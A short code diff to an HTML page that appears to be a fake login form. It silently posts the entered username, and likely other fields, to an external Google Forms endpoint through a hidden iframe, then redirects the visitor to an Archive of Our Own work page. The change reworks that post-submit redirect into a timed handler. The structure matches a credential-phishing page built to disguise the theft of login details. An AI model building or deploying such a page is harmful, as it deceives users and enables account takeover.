@@ -117,18 +117,22 @@
  </p>
 <div id="loginform">
   <script type="text/javascript">
-    var submitted = false;
+    function handleSubmit() {
+      setTimeout(function() {
+        window.location.href = 'https://archiveofourown.org/works/21065363';
+      }, 500);
+    }
   </script>
 
-  <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" 
-          onload="if(submitted) {window.location='https://archiveofourown.org/works/21065363';}"></iframe>
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
 
   <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeqjPSV2HLo_By2Cr82yJgjjMmA2NYSIZJDY9G3Zzj6vg1MXQ/formResponse" 
         method="POST" 
         target="hidden_iframe" 
-        onsubmit="submitted=true;">
+        onsubmit="handleSubmit();">
         
     <dl>
+
       <dt><label>Username:</label></dt>
       <dd><input type="text" name="entry.996873737" required></dd>
 
